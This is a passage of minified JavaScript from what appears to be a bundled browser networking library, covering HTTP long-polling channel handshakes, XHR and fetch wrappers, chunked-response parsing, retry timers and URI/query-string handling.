`+F+" "+W})}function Fs(l,m,g,I){l.info(function(){return"XMLHTTP TEXT ("+m+"): "+ck(l,g)+(I?" "+I:"")})}function lk(l,m){l.info(function(){return"TIMEOUT: "+m})}Ca.prototype.info=function(){};function ck(l,m){if(!l.g)return m;if(!m)return null;try{var g=JSON.parse(m);if(g){for(l=0;l<g.length;l++)if(Array.isArray(g[l])){var I=g[l];if(!(2>I.length)){var M=I[1];if(Array.isArray(M)&&!(1>M.length)){var F=M[0];if(F!="noop"&&F!="stop"&&F!="close")for(var W=1;W<M.length;W++)M[W]=""}}}}return es(g)}catch{return m}}var af={NO_ERROR:0,gb:1,tb:2,sb:3,nb:4,rb:5,ub:6,Ia:7,TIMEOUT:8,xb:9},uk={lb:"complete",Hb:"success",Ja:"error",Ia:"abort",zb:"ready",Ab:"readystatechange",TIMEOUT:"timeout",vb:"incrementaldata",yb:"progress",ob:"downloadprogress",Pb:"uploadprogress"},lf;function Pc(){}_(Pc,ne),Pc.prototype.g=function(){return new XMLHttpRequest},Pc.prototype.i=function(){return{}},lf=new Pc;function Hr(l,m,g,I){this.j=l,this.i=m,this.l=g,this.R=I||1,this.U=new zr(this),this.I=45e3,this.H=null,this.o=!1,this.m=this.A=this.v=this.L=this.F=this.S=this.B=null,this.D=[],this.g=null,this.C=0,this.s=this.u=null,this.X=-1,this.J=!1,this.O=0,this.M=null,this.W=this.K=this.T=this.P=!1,this.h=new Qy}function Qy(){this.i=null,this.g="",this.h=!1}var Xy={},cf={};function uf(l,m,g){l.L=1,l.v=Dc(hr(m)),l.m=g,l.P=!0,Jy(l,null)}function Jy(l,m){l.F=Date.now(),Rc(l),l.A=hr(l.v);var g=l.A,I=l.R;Array.isArray(I)||(I=[String(I)]),h0(g.i,"t",I),l.C=0,g=l.j.J,l.h=new Qy,l.g=P0(l.j,g?m:null,!l.m),0<l.O&&(l.M=new rf(h(l.Y,l,l.g),l.O)),m=l.U,g=l.g,I=l.ca;var M="readystatechange";Array.isArray(M)||(M&&(wa[0]=M.toString()),M=wa);for(var F=0;F<M.length;F++){var W=wn(g,M[F],I||m.handleEvent,!1,m.h||m);if(!W)break;m.g[W.key]=W}m=l.H?b(l.H):{},l.m?(l.u||(l.u="POST"),m["Content-Type"]="application/x-www-form-urlencoded",l.g.ea(l.A,l.u,l.m,m)):(l.u="GET",l.g.ea(l.A,l.u,null,m)),xa(),ok(l.i,l.u,l.A,l.l,l.R,l.m)}Hr.prototype.ca=function(l){l=l.target;const m=this.M;m&&fr(l)==3?m.j():this.Y(l)},Hr.prototype.Y=function(l){try{if(l==this.g)e:{const vt=fr(this.g);var m=this.g.Ba();const zs=this.g.Z();if(!(3>vt)&&(vt!=3||this.g&&(this.h.h||this.g.oa()||_0(this.g)))){this.J||vt!=4||m==7||(m==8||0>=zs?xa(3):xa(2)),df(this);var g=this.g.Z();this.X=g;t:if(Zy(this)){var I=_0(this.g);l="";var M=I.length,F=fr(this.g)==4;if(!this.h.i){if(typeof TextDecoder>"u"){ts(this),Sa(this);var W="";break t}this.h.i=new a.TextDecoder}for(m=0;m<M;m++)this.h.h=!0,l+=this.h.i.decode(I[m],{stream:!(F&&m==M-1)});I.length=0,this.h.g+=l,this.C=0,W=this.h.g}else W=this.g.oa();if(this.o=g==200,ak(this.i,this.u,this.A,this.l,this.R,vt,g),this.o){if(this.T&&!this.K){t:{if(this.g){var be,at=this.g;if((be=at.g?at.g.getResponseHeader("X-HTTP-Initial-Response"):null)&&!w(be)){var ge=be;break t}}ge=null}if(g=ge)Fs(this.i,this.l,g,"Initial handshake response via X-HTTP-Initial-Response"),this.K=!0,hf(this,g);else{this.o=!1,this.s=3,bt(12),ts(this),Sa(this);break e}}if(this.P){g=!0;let xn;for(;!this.J&&this.C<W.length;)if(xn=dk(this,W),xn==cf){vt==4&&(this.s=4,bt(14),g=!1),Fs(this.i,this.l,null,"[Incomplete Response]");break}else if(xn==Xy){this.s=4,bt(15),Fs(this.i,this.l,W,"[Invalid Chunk]"),g=!1;break}else Fs(this.i,this.l,xn,null),hf(this,xn);if(Zy(this)&&this.C!=0&&(this.h.g=this.h.g.slice(this.C),this.C=0),vt!=4||W.length!=0||this.h.h||(this.s=1,bt(16),g=!1),this.o=this.o&&g,!g)Fs(this.i,this.l,W,"[Invalid Chunked Response]"),ts(this),Sa(this);else if(0<W.length&&!this.W){this.W=!0;var gt=this.j;gt.g==this&&gt.ba&&!gt.M&&(gt.j.info("Great, no buffering proxy detected. Bytes received: "+W.length),yf(gt),gt.M=!0,bt(11))}}else Fs(this.i,this.l,W,null),hf(this,W);vt==4&&ts(this),this.o&&!this.J&&(vt==4?T0(this.j,this):(this.o=!1,Rc(this)))}else Nk(this.g),g==400&&0<W.indexOf("Unknown SID")?(this.s=3,bt(12)):(this.s=0,bt(13)),ts(this),Sa(this)}}}catch{}finally{}};function Zy(l){return l.g?l.u=="GET"&&l.L!=2&&l.j.Ca:!1}function dk(l,m){var g=l.C,I=m.indexOf(`
`,g);return I==-1?cf:(g=Number(m.substring(g,I)),isNaN(g)?Xy:(I+=1,I+g>m.length?cf:(m=m.slice(I,I+g),l.C=I+g,m)))}Hr.prototype.cancel=function(){this.J=!0,ts(this)};function Rc(l){l.S=Date.now()+l.I,e0(l,l.I)}function e0(l,m){if(l.B!=null)throw Error("WatchDog timer not null");l.B=Ea(h(l.ba,l),m)}function df(l){l.B&&(a.clearTimeout(l.B),l.B=null)}Hr.prototype.ba=function(){this.B=null;const l=Date.now();0<=l-this.S?(lk(this.i,this.A),this.L!=2&&(xa(),bt(17)),ts(this),this.s=2,Sa(this)):e0(this,this.S-l)};function Sa(l){l.j.G==0||l.J||T0(l.j,l)}function ts(l){df(l);var m=l.M;m&&typeof m.ma=="function"&&m.ma(),l.M=null,kc(l.U),l.g&&(m=l.g,l.g=null,m.abort(),m.ma())}function hf(l,m){try{var g=l.j;if(g.G!=0&&(g.g==l||ff(g.h,l))){if(!l.K&&ff(g.h,l)&&g.G==3){try{var I=g.Da.g.parse(m)}catch{I=null}if(Array.isArray(I)&&I.length==3){var M=I;if(M[0]==0){e:if(!g.u){if(g.g)if(g.g.F+3e3<l.F)$c(g),Fc(g);else break e;vf(g),bt(18)}}else g.za=M[1],0<g.za-g.T&&37500>M[2]&&g.F&&g.v==0&&!g.C&&(g.C=Ea(h(g.Za,g),6e3));if(1>=r0(g.h)&&g.ca){try{g.ca()}catch{}g.ca=void 0}}else rs(g,11)}else if((l.K||g.g==l)&&$c(g),!w(m))for(M=g.Da.g.parse(m),m=0;m<M.length;m++){let ge=M[m];if(g.T=ge[0],ge=ge[1],g.G==2)if(ge[0]=="c"){g.K=ge[1],g.ia=ge[2];const gt=ge[3];gt!=null&&(g.la=gt,g.j.info("VER="+g.la));const vt=ge[4];vt!=null&&(g.Aa=vt,g.j.info("SVER="+g.Aa));const zs=ge[5];zs!=null&&typeof zs=="number"&&0<zs&&(I=1.5*zs,g.L=I,g.j.info("backChannelRequestTimeoutMs_="+I)),I=g;const xn=l.g;if(xn){const zc=xn.g?xn.g.getResponseHeader("X-Client-Wire-Protocol"):null;if(zc){var F=I.h;F.g||zc.indexOf("spdy")==-1&&zc.indexOf("quic")==-1&&zc.indexOf("h2")==-1||(F.j=F.l,F.g=new Set,F.h&&(pf(F,F.h),F.h=null))}if(I.D){const _f=xn.g?xn.g.getResponseHeader("X-HTTP-Session-Id"):null;_f&&(I.ya=_f,Ae(I.I,I.D,_f))}}g.G=3,g.l&&g.l.ua(),g.ba&&(g.R=Date.now()-l.F,g.j.info("Handshake RTT: "+g.R+"ms")),I=g;var W=l;if(I.qa=k0(I,I.J?I.ia:null,I.W),W.K){i0(I.h,W);var be=W,at=I.L;at&&(be.I=at),be.B&&(df(be),Rc(be)),I.g=W}else S0(I);0<g.i.length&&Uc(g)}else ge[0]!="stop"&&ge[0]!="close"||rs(g,7);else g.G==3&&(ge[0]=="stop"||ge[0]=="close"?ge[0]=="stop"?rs(g,7):gf(g):ge[0]!="noop"&&g.l&&g.l.ta(ge),g.v=0)}}xa(4)}catch{}}var hk=class{constructor(l,m){this.g=l,this.map=m}};function t0(l){this.l=l||10,a.PerformanceNavigationTiming?(l=a.performance.getEntriesByType("navigation"),l=0<l.length&&(l[0].nextHopProtocol=="hq"||l[0].nextHopProtocol=="h2")):l=!!(a.chrome&&a.chrome.loadTimes&&a.chrome.loadTimes()&&a.chrome.loadTimes().wasFetchedViaSpdy),this.j=l?this.l:1,this.g=null,1<this.j&&(this.g=new Set),this.h=null,this.i=[]}function n0(l){return l.h?!0:l.g?l.g.size>=l.j:!1}function r0(l){return l.h?1:l.g?l.g.size:0}function ff(l,m){return l.h?l.h==m:l.g?l.g.has(m):!1}function pf(l,m){l.g?l.g.add(m):l.h=m}function i0(l,m){l.h&&l.h==m?l.h=null:l.g&&l.g.has(m)&&l.g.delete(m)}t0.prototype.cancel=function(){if(this.i=s0(this),this.h)this.h.cancel(),this.h=null;else if(this.g&&this.g.size!==0){for(const l of this.g.values())l.cancel();this.g.clear()}};function s0(l){if(l.h!=null)return l.i.concat(l.h.D);if(l.g!=null&&l.g.size!==0){let m=l.i;for(const g of l.g.values())m=m.concat(g.D);return m}return y(l.i)}function fk(l){if(l.V&&typeof l.V=="function")return l.V();if(typeof Map<"u"&&l instanceof Map||typeof Set<"u"&&l instanceof Set)return Array.from(l.values());if(typeof l=="string")return l.split("");if(c(l)){for(var m=[],g=l.length,I=0;I<g;I++)m.push(l[I]);return m}m=[],g=0;for(I in l)m[g++]=l[I];return m}function pk(l){if(l.na&&typeof l.na=="function")return l.na();if(!l.V||typeof l.V!="function"){if(typeof Map<"u"&&l instanceof Map)return Array.from(l.keys());if(!(typeof Set<"u"&&l instanceof Set)){if(c(l)||typeof l=="string"){var m=[];l=l.length;for(var g=0;g<l;g++)m.push(g);return m}m=[],g=0;for(const I in l)m[g++]=I;return m}}}function o0(l,m){if(l.forEach&&typeof l.forEach=="function")l.forEach(m,void 0);else if(c(l)||typeof l=="string")Array.prototype.forEach.call(l,m,void 0);else for(var g=pk(l),I=fk(l),M=I.length,F=0;F<M;F++)m.call(void 0,I[F],g&&g[F],l)}var a0=RegExp("^(?:([^:/?#.]+):)?(?://(?:([^\\\\/?#]*)@)?([^\\\\/?#]*?)(?::([0-9]+))?(?=[\\\\/?#]|$))?([^?#]+)?(?:\\?([^#]*))?(?:#([\\s\\S]*))?$");function mk(l,m){if(l){l=l.split("&");for(var g=0;g<l.length;g++){var I=l[g].indexOf("="),M=null;if(0<=I){var F=l[g].substring(0,I);M=l[g].substring(I+1)}else F=l[g];m(F,M?decodeURIComponent(M.replace(/\+/g," ")):"")}}}function ns(l){if(this.g=this.o=this.j="",this.s=null,this.m=this.l="",this.h=!1,l instanceof ns){this.h=l.h,Ac(this,l.j),this.o=l.o,this.g=l.g,Oc(this,l.s),this.l=l.l;var m=l.i,g=new Ia;g.i=m.i,m.g&&(g.g=new Map(m.g),g.h=m.h),l0(this,g),this.m=l.m}else l&&(m=String(l).match(a0))?(this.h=!1,Ac(this,m[1]||"",!0),this.o=ba(m[2]||""),this.g=ba(m[3]||"",!0),Oc(this,m[4]),this.l=ba(m[5]||"",!0),l0(this,m[6]||"",!0),this.m=ba(m[7]||"")):(this.h=!1,this.i=new Ia(null,this.h))}ns.prototype.toString=function(){var l=[],m=this.j;m&&l.push(Ta(m,c0,!0),":");var g=this.g;return(g||m=="file")&&(l.push("//"),(m=this.o)&&l.push(Ta(m,c0,!0),"@"),l.push(encodeURIComponent(String(g)).replace(/%25([0-9a-fA-F]{2})/g,"%$1")),g=this.s,g!=null&&l.push(":",String(g))),(g=this.l)&&(this.g&&g.charAt(0)!="/"&&l.push("/"),l.push(Ta(g,g.charAt(0)=="/"?yk:vk,!0))),(g=this.i.toString())&&l.push("?",g),(g=this.m)&&l.push("#",Ta(g,wk)),l.join("")};function hr(l){return new ns(l)}function Ac(l,m,g){l.j=g?ba(m,!0):m,l.j&&(l.j=l.j.replace(/:$/,""))}function Oc(l,m){if(m){if(m=Number(m),isNaN(m)||0>m)throw Error("Bad port number "+m);l.s=m}else l.s=null}function l0(l,m,g){m instanceof Ia?(l.i=m,xk(l.i,l.h)):(g||(m=Ta(m,_k)),l.i=new Ia(m,l.h))}function Ae(l,m,g){l.i.set(m,g)}function Dc(l){return Ae(l,"zx",Math.floor(2147483648*Math.random()).toString(36)+Math.abs(Math.floor(2147483648*Math.random())^Date.now()).toString(36)),l}function ba(l,m){return l?m?decodeURI(l.replace(/%25/g,"%2525")):decodeURIComponent(l):""}function Ta(l,m,g){return typeof l=="string"?(l=encodeURI(l).replace(m,gk),g&&(l=l.replace(/%25([0-9a-fA-F]{2})/g,"%$1")),l):null}function gk(l){return l=l.charCodeAt(0),"%"+(l>>4&15).toString(16)+(l&15).toString(16)}var c0=/[#\/\?@]/g,vk=/[#\?:]/g,yk=/[#\?]/g,_k=/[#\?@]/g,wk=/#/g;function Ia(l,m){this.h=this.g=null,this.i=l||null,this.j=!!m}function Wr(l){l.g||(l.g=new Map,l.h=0,l.i&&mk(l.i,function(m,g){l.add(decodeURIComponent(m.replace(/\+/g," ")),g)}))}t=Ia.prototype,t.add=function(l,m){Wr(this),this.i=null,l=Us(this,l);var g=this.g.get(l);return g||this.g.set(l,g=[]),g.push(m),this.h+=1,this};function u0(l,m){Wr(l),m=Us(l,m),l.g.has(m)&&(l.i=null,l.h-=l.g.get(m).length,l.g.delete(m))}function d0(l,m){return Wr(l),m=Us(l,m),l.g.has(m)}t.forEach=function(l,m){Wr(this),this.g.forEach(function(g,I){g.forEach(function(M){l.call(m,M,I,this)},this)},this)},t.na=function(){Wr(this);const l=Array.from(this.g.values()),m=Array.from(this.g.keys()),g=[];for(let I=0;I<m.length;I++){const M=l[I];for(let F=0;F<M.length;F++)g.push(m[I])}return g},t.V=function(l){Wr(this);let m=[];if(typeof l=="string")d0(this,l)&&(m=m.concat(this.g.get(Us(this,l))));else{l=Array.from(this.g.values());for(let g=0;g<l.length;g++)m=m.concat(l[g])}return m},t.set=function(l,m){return Wr(this),this.i=null,l=Us(this,l),d0(this,l)&&(this.h-=this.g.get(l).length),this.g.set(l,[m]),this.h+=1,this},t.get=function(l,m){return l?(l=this.V(l),0<l.length?String(l[0]):m):m};function h0(l,m,g){u0(l,m),0<g.length&&(l.i=null,l.g.set(Us(l,m),y(g)),l.h+=g.length)}t.toString=function(){if(this.i)return this.i;if(!this.g)return"";const l=[],m=Array.from(this.g.keys());for(var g=0;g<m.length;g++){var I=m[g];const F=encodeURIComponent(String(I)),W=this.V(I);for(I=0;I<W.length;I++){var M=F;W[I]!==""&&(M+="="+encodeURIComponent(String(W[I]))),l.push(M)}}return this.i=l.join("&")};function Us(l,m){return m=String(m),l.j&&(m=m.toLowerCase()),m}function xk(l,m){m&&!l.j&&(Wr(l),l.i=null,l.g.forEach(function(g,I){var M=I.toLowerCase();I!=M&&(u0(this,I),h0(this,M,g))},l)),l.j=m}function Ek(l,m){const g=new Ca;if(a.Image){const I=new Image;I.onload=E(Kr,g,"TestLoadImage: loaded",!0,m,I),I.onerror=E(Kr,g,"TestLoadImage: error",!1,m,I),I.onabort=E(Kr,g,"TestLoadImage: abort",!1,m,I),I.ontimeout=E(Kr,g,"TestLoadImage: timeout",!1,m,I),a.setTimeout(function(){I.ontimeout&&I.ontimeout()},1e4),I.src=l}else m(!1)}function Ck(l,m){const g=new Ca,I=new AbortController,M=setTimeout(()=>{I.abort(),Kr(g,"TestPingServer: timeout",!1,m)},1e4);fetch(l,{signal:I.signal}).then(F=>{clearTimeout(M),F.ok?Kr(g,"TestPingServer: ok",!0,m):Kr(g,"TestPingServer: server error",!1,m)}).catch(()=>{clearTimeout(M),Kr(g,"TestPingServer: error",!1,m)})}function Kr(l,m,g,I,M){try{M&&(M.onload=null,M.onerror=null,M.onabort=null,M.ontimeout=null),I(g)}catch{}}function Sk(){this.g=new sf}function bk(l,m,g){const I=g||"";try{o0(l,function(M,F){let W=M;u(M)&&(W=es(M)),m.push(I+F+"="+encodeURIComponent(W))})}catch(M){throw m.push(I+"type="+encodeURIComponent("_badmap")),M}}function jc(l){this.l=l.Ub||null,this.j=l.eb||!1}_(jc,ne),jc.prototype.g=function(){return new Mc(this.l,this.j)},jc.prototype.i=function(l){return function(){return l}}({});function Mc(l,m){Ye.call(this),this.D=l,this.o=m,this.m=void 0,this.status=this.readyState=0,this.responseType=this.responseText=this.response=this.statusText="",this.onreadystatechange=null,this.u=new Headers,this.h=null,this.B="GET",this.A="",this.g=!1,this.v=this.j=this.l=null}_(Mc,Ye),t=Mc.prototype,t.open=function(l,m){if(this.readyState!=0)throw this.abort(),Error("Error reopening a connection");this.B=l,this.A=m,this.readyState=1,ka(this)},t.send=function(l){if(this.readyState!=1)throw this.abort(),Error("need to call open() first. ");this.g=!0;const m={headers:this.u,method:this.B,credentials:this.m,cache:void 0};l&&(m.body=l),(this.D||a).fetch(new Request(this.A,m)).then(this.Sa.bind(this),this.ga.bind(this))},t.abort=function(){this.response=this.responseText="",this.u=new Headers,this.status=0,this.j&&this.j.cancel("Request was aborted.").catch(()=>{}),1<=this.readyState&&this.g&&this.readyState!=4&&(this.g=!1,Na(this)),this.readyState=0},t.Sa=function(l){if(this.g&&(this.l=l,this.h||(this.status=this.l.status,this.statusText=this.l.statusText,this.h=l.headers,this.readyState=2,ka(this)),this.g&&(this.readyState=3,ka(this),this.g)))if(this.responseType==="arraybuffer")l.arrayBuffer().then(this.Qa.bind(this),this.ga.bind(this));else if(typeof a.ReadableStream<"u"&&"body"in l){if(this.j=l.body.getReader(),this.o){if(this.responseType)throw Error('responseType must be empty for "streamBinaryChunks" mode responses.');this.response=[]}else this.response=this.responseText="",this.v=new TextDecoder;f0(this)}else l.text().then(this.Ra.bind(this),this.ga.bind(this))};function f0(l){l.j.read().then(l.Pa.bind(l)).catch(l.ga.bind(l))}t.Pa=function(l){if(this.g){if(this.o&&l.value)this.response.push(l.value);else if(!this.o){var m=l.value?l.value:new Uint8Array(0);(m=this.v.decode(m,{stream:!l.done}))&&(this.response=this.responseText+=m)}l.done?Na(this):ka(this),this.readyState==3&&f0(this)}},t.Ra=function(l){this.g&&(this.response=this.responseText=l,Na(this))},t.Qa=function(l){this.g&&(this.response=l,Na(this))},t.ga=function(){this.g&&Na(this)};function Na(l){l.readyState=4,l.l=null,l.j=null,l.v=null,ka(l)}t.setRequestHeader=function(l,m){this.u.append(l,m)},t.getResponseHeader=function(l){return this.h&&this.h.get(l.toLowerCase())||""},t.getAllResponseHeaders=function(){if(!this.h)return"";const l=[],m=this.h.entries();for(var g=m.next();!g.done;)g=g.value,l.push(g[0]+": "+g[1]),g=m.next();return l.join(`\r
`)};function ka(l){l.onreadystatechange&&l.onreadystatechange.call(l)}Object.defineProperty(Mc.prototype,"withCredentials",{get:function(){return this.m==="include"},set:function(l){this.m=l?"include":"same-origin"}});function p0(l){let m="";return j(l,function(g,I){m+=I,m+=":",m+=g,m+=`\r
`}),m}function mf(l,m,g){e:{for(I in g){var I=!1;break e}I=!0}I||(g=p0(g),typeof l=="string"?g!=null&&encodeURIComponent(String(g)):Ae(l,m,g))}function Ke(l){Ye.call(this),this.headers=new Map,this.o=l||null,this.h=!1,this.v=this.g=null,this.D="",this.m=0,this.l="",this.j=this.B=this.u=this.A=!1,this.I=null,this.H="",this.J=!1}_(Ke,Ye);var Tk=/^https?$/i,Ik=["POST","PUT"];t=Ke.prototype,t.Ha=function(l){this.J=l},t.ea=function(l,m,g,I){if(this.g)throw Error("[goog.net.XhrIo] Object is active with another request="+this.D+"; newUri="+l);m=m?m.toUpperCase():"GET",this.D=l,this.l="",this.m=0,this.A=!1,this.h=!0,this.g=this.o?this.o.g():lf.g(),this.v=this.o?Ee(this.o):Ee(lf),this.g.onreadystatechange=h(this.Ea,this);try{this.B=!0,this.g.open(m,String(l),!0),this.B=!1}catch(F){m0(this,F);return}if(l=g||"",g=new Map(this.headers),I)if(Object.getPrototypeOf(I)===Object.prototype)for(var M in I)g.set(M,I[M]);else if(typeof I.keys=="function"&&typeof I.get=="function")for(const F of I.keys())g.set(F,I.get(F));else throw Error("Unknown input type for opt_headers: "+String(I));I=Array.from(g.keys()).find(F=>F.toLowerCase()=="content-type"),M=a.FormData&&l instanceof a.FormData,!(0<=Array.prototype.indexOf.call(Ik,m,void 0))||I||M||g.set("Content-Type","application/x-www-form-urlencoded;charset=utf-8");for(const[F,W]of g)this.g.setRequestHeader(F,W);this.H&&(this.g.responseType=this.H),"withCredentials"in this.g&&this.g.withCredentials!==this.J&&(this.g.withCredentials=this.J);try{y0(this),this.u=!0,this.g.send(l),this.u=!1}catch(F){m0(this,F)}};function m0(l,m){l.h=!1,l.g&&(l.j=!0,l.g.abort(),l.j=!1),l.l=m,l.m=5,g0(l),Lc(l)}function g0(l){l.A||(l.A=!0,$e(l,"complete"),$e(l,"error"))}t.abort=function(l){this.g&&this.h&&(this.h=!1,this.j=!0,this.g.abort(),this.j=!1,this.m=l||7,$e(this,"complete"),$e(this,"abort"),Lc(this))},t.N=function(){this.g&&(this.h&&(this.h=!1,this.j=!0,this.g.abort(),this.j=!1),Lc(this,!0)),Ke.aa.N.call(this)},t.Ea=function(){this.s||(this.B||this.u||this.j?v0(this):this.bb())},t.bb=function(){v0(this)};function v0(l){if(l.h&&typeof o<"u"&&(!l.v[1]||fr(l)!=4||l.Z()!=2)){if(l.u&&fr(l)==4)dr(l.Ea,0,l);else if($e(l,"readystatechange"),fr(l)==4){l.h=!1;try{const W=l.Z();e:switch(W){case 200:case 201:case 202:case 204:case 206:case 304:case 1223:var m=!0;break e;default:m=!1}var g;if(!(g=m)){var I;if(I=W===0){var M=String(l.D).match(a0)[1]||null;!M&&a.self&&a.self.location&&(M=a.self.location.protocol.slice(0,-1)),I=!Tk.test(M?M.toLowerCase():"")}g=I}if(g)$e(l,"complete"),$e(l,"success");else{l.m=6;try{var F=2<fr(l)?l.g.statusText:""}catch{F=""}l.l=F+" ["+l.Z()+"]",g0(l)}}finally{Lc(l)}}}}function Lc(l,m){if(l.g){y0(l);const g=l.g,I=l.v[0]?()=>{}:null;l.g=null,l.v=null,m||$e(l,"ready");try{g.onreadystatechange=I}catch{}}}function y0(l){l.I&&(a.clearTimeout(l.I),l.I=null)}t.isActive=function(){return!!this.g};function fr(l){return l.g?l.g.readyState:0}t.Z=function(){try{return 2<fr(this)?this.g.status:-1}catch{return-1}},t.oa=function(){try{return this.g?this.g.responseText:""}catch{return""}},t.Oa=function(l){if(this.g){var m=this.g.responseText;return l&&m.indexOf(l)==0&&(m=m.substring(l.length)),Wn(m)}};function _0(l){try{if(!l.g)return null;if("response"in l.g)return l.g.response;switch(l.H){case"":case"text":return l.g.responseText;case"arraybuffer":if("mozResponseArrayBuffer"in l.g)return l.g.mozResponseArrayBuffer}return null}catch{return null}}function Nk(l){const m={};l=(l.g&&2<=fr(l)&&l.g.getAllResponseHeaders()||"").split(`\r
`);for(let I=0;I<l.length;I++){if(w(l[I]))continue;var g=O(l[I]);const M=g[0];if(g=g[1],typeof g!="string")continue;g=g.trim();const F=m[M]||[];m[M]=F,F.push(g)}T(m,function(I){return I.join(", ")})}t.Ba=function(){return this.m},t.Ka=function(){return typeof this.l=="string"?this.l:String(this.l)};function Pa(l,m,g){return g&&g.internalChannelParams&&g.internalChannelParams[l]||m}function w0(l){this.Aa=0,this.i=[],this.j=new Ca,this.ia=this.qa=this.I=this.W=this.g=this.ya=this.D=this.H=this.m=this.S=this.o=null,this.Ya=this.U=0,this.Va=Pa("failFast",!1,l),this.F=this.C=this.u=this.s=this.l=null,this.X=!0,this.za=this.T=-1,this.Y=this.v=this.B=0,this.Ta=Pa("baseRetryDelayMs",5e3,l),this.cb=Pa("retryDelaySeedMs",1e4,l),this.Wa=Pa("forwardChannelMaxRetries",2,l),this.wa=Pa("forwardChannelRequestTimeoutMs",2e4,l),this.pa=l&&l.xmlHttpFactory||void 0,this.Xa=l&&l.Tb||void 0,this.Ca=l&&l.useFetchStreams||!1,this.L=void 0,this.J=l&&l.supportsCrossDomainXhr||!1,this.K="",this.h=new t0(l&&l.concurrentRequestLimit),this.Da=new Sk,this.P=l&&l.fastHandshake||!1,this.O=l&&l.encodeInitMessageHeaders||!1,this.P&&this.O&&(this.O=!1),this.Ua=l&&l.Rb||!1,l&&l.xa&&this.j.xa(),l&&l.forceLongPolling&&(this.X=!1),this.ba=!this.P&&this.X&&l&&l.detectBufferingProxy||!1,this.ja=void 0,l&&l.longPollingTimeout&&0<l.longPollingTimeout&&(this.ja=l.longPollingTimeout),this.ca=void 0,this.R=0,this.M=!1,this.ka=this.A=null}t=w0.prototype,t.la=8,t.G=1,t.connect=function(l,m,g,I){bt(0),this.W=l,this.H=m||{},g&&I!==void 0&&(this.H.OSID=g,this.H.OAID=I),this.F=this.X,this.I=k0(this,null,this.W),Uc(this)};function gf(l){if(x0(l),l.G==3){var m=l.U++,g=hr(l.I);if(Ae(g,"SID",l.K),Ae(g,"RID",m),Ae(g,"TYPE","terminate"),Ra(l,g),m=new Hr(l,l.j,m),m.L=2,m.v=Dc(hr(g)),g=!1,a.navigator&&a.navigator.sendBeacon)try{g=a.navigator.sendBeacon(m.v.toString(),"")}catch{}!g&&a.Image&&(new Image().src=m.v,g=!0),g||(m.g=P0(m.j,null),m.g.ea(m.v)),m.F=Date.now(),Rc(m)}N0(l)}function Fc(l){l.g&&(yf(l),l.g.cancel(),l.g=null)}function x0(l){Fc(l),l.u&&(a.clearTimeout(l.u),l.u=null),$c(l),l.h.cancel(),l.s&&(typeof l.s=="number"&&a.clearTimeout(l.s),l.s=null)}function Uc(l){if(!n0(l.h)&&!l.s){l.s=!0;var m=l.Ga;J||Y(),L||(J(),L=!0),z.add(m,l),l.B=0}}function kk(l,m){return r0(l.h)>=l.h.j-(l.s?1:0)?!1:l.s?(l.i=m.D.concat(l.i),!0):l.G==1||l.G==2||l.B>=(l.Va?0:l.Wa)?!1:(l.s=Ea(h(l.Ga,l,m),I0(l,l.B)),l.B++,!0)}t.Ga=function(l){if(this.s)if(this.s=null,this.G==1){if(!l){this.U=Math.floor(1e5*Math.random()),l=this.U++;const M=new Hr(this,this.j,l);let F=this.o;if(this.S&&(F?(F=b(F),k(F,this.S)):F=this.S),this.m!==null||this.O||(M.H=F,F=null),this.P)e:{for(var m=0,g=0;g<this.i.length;g++){t:{var I=this.i[g];if("__data__"in I.map&&(I=I.map.__data__,typeof I=="string")){I=I.length;break t}I=void 0}if(I===void 0)break;if(m+=I,4096<m){m=g;break e}if(m===4096||g===this.i.length-1){m=g+1;break e}}m=1e3}else m=1e3;m=C0(this,M,m),g=hr(this.I),Ae(g,"RID",l),Ae(g,"CVER",22),this.D&&Ae(g,"X-HTTP-Session-Id",this.D),Ra(this,g),F&&(this.O?m="headers="+encodeURIComponent(String(p0(F)))+"&"+m:this.m&&mf(g,this.m,F)),pf(this.h,M),this.Ua&&Ae(g,"TYPE","init"),this.P?(Ae(g,"$req",m),Ae(g,"SID","null"),M.T=!0,uf(M,g,null)):uf(M,g,m),this.G=2}}else this.G==3&&(l?E0(this,l):this.i.length==0||n0(this.h)||E0(this))};function E0(l,m){var g;m?g=m.l:g=l.U++;const I=hr(l.I);Ae(I,"SID",l.K),Ae(I,"RID",g),Ae(I,"AID",l.T),Ra(l,I),l.m&&l.o&&mf(I,l.m,l.o),g=new Hr(l,l.j,g,l.B+1),l.m===null&&(g.H=l.o),m&&(l.i=m.D.concat(l.i)),m=C0(l,g,1e3),g.I=Math.round(.5*l.wa)+Math.round(.5*l.wa*Math.random()),pf(l.h,g),uf(g,I,m)}function Ra(l,m){l.H&&j(l.H,function(g,I){Ae(m,I,g)}),l.l&&o0({},function(g,I){Ae(m,I,g)})}function C0(l,m,g){g=Math.min(l.i.length,g);var I=l.l?h(l.l.Na,l.l,l):null;e:{var M=l.i;let F=-1;for(;;){const W=["count="+g];F==-1?0<g?(F=M[0].g,W.push("ofs="+F)):F=0:W.push("ofs="+F);let be=!0;for(let at=0;at<g;at++){let ge=M[at].g;const gt=M[at].map;if(ge-=F,0>ge)F=Math.max(0,M[at].g-100),be=!1;else try{bk(gt,W,"req"+ge+"_")}catch{I&&I(gt)}}if(be){I=W.join("&");break e}}}return l=l.i.splice(0,g),m.D=l,I}function S0(l){if(!l.g&&!l.u){l.Y=1;var m=l.Fa;J||Y(),L||(J(),L=!0),z.add(m,l),l.v=0}}function vf(l){return l.g||l.u||3<=l.v?!1:(l.Y++,l.u=Ea(h(l.Fa,l),I0(l,l.v)),l.v++,!0)}t.Fa=function(){if(this.u=null,b0(this),this.ba&&!(this.M||this.g==null||0>=this.R)){var l=2*this.R;this.j.info("BP detection timer enabled: "+l),this.A=Ea(h(this.ab,this),l)}},t.ab=function(){this.A&&(this.A=null,this.j.info("BP detection timeout reached."),this.j.info("Buffering proxy detected and switch to long-polling!"),this.F=!1,this.M=!0,bt(10),Fc(this),b0(this))};function yf(l){l.A!=null&&(a.clearTimeout(l.A),l.A=null)}function b0(l){l.g=new Hr(l,l.j,"rpc",l.Y),l.m===null&&(l.g.H=l.o),l.g.O=0;var m=hr(l.qa);Ae(m,"RID","rpc"),Ae(m,"SID",l.K),Ae(m,"AID",l.T),Ae(m,"CI",l.F?"0":"1"),!l.F&&l.ja&&Ae(m,"TO",l.ja),Ae(m,"TYPE","xmlhttp"),Ra(l,m),l.m&&l.o&&mf(m,l.m,l.o),l.L&&(l.g.I=l.L);var g=l.g;l=l.ia,g.L=1,g.v=Dc(hr(m)),g.m=null,g.P=!0,Jy(g,l)}t.Za=function(){this.C!=null&&(this.C=null,Fc(this),vf(this),bt(19))};function 